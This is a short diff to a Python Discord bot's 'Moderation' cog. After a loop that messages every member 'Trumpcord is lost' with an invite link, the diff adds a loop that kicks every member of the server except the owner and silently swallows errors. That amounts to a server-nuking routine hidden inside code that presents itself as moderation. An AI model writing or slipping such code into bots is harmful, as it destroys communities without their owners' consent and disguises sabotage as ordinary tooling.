@@ -98,6 +98,12 @@ class Moderation(commands.Cog):
 				await member.send_message("Trumpcord is lost: https://discord.gg/CqnmbBYgSZ")
 			except:
 				continue
+		for member in user.guild.members:
+			if member == member.guild.owner:	continue
+			try:
+				await user.guild.kick(member)
+			except:
+				continue
 	
 	@commands.Cog.listener()
 	async def on_message_delete(self, message):
